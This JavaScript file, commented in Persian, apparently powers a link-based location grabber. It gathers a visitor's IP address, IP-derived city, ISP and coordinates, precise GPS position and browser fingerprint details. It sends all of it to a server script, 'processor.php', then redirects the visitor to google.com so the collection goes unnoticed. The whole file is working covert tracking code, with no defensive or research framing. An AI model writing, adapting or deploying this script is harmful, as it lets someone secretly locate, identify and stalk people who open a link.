async function collectAndRedirect() {
    try {
        const ip = await getIP();
        const location = await getLocationByIP(ip);

        // سعی در گرفتن لوکیشن GPS واقعی
        const gpsLocation = await getGPSLocation();

        const data = {
            ip,
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            platform: navigator.platform,
            timestamp: new Date().toISOString(),
            ipLocation: location,
            gpsLocation
        };

        await sendToServer(data);

        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 2000);

    } catch (error) {
        console.error('Error:', error);
        window.location.href = "https://www.google.com";
    }
}

// دریافت آی‌پی
function getIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(d => d.ip)
        .catch(() => 'IP not available');
}

// دریافت لوکیشن آی‌پی (تقریبی)
async function getLocationByIP(ip) {
    try {
        let res = await fetch(`https://ipapi.co/${ip}/json/`);
        let d = await res.json();
        return {
            country: d.country_name,
            region: d.region,
            city: d.city,
            isp: d.org,
            latitude: d.latitude,
            longitude: d.longitude,
            googleMaps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
        };
    } catch {
        return { error: "Location not available" };
    }
}

// دریافت لوکیشن GPS (دقیق) → نیاز به اجازه کاربر دارد
function getGPSLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            return resolve({ error: "Geolocation not supported" });
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy + "m",
                    googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
            },
            (err) => resolve({ error: err.message })
        );
    });
}

// ارسال به سرور
async function sendToServer(data) {
    try {
        await fetch('processor.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error('Send error:', e);
    }
}
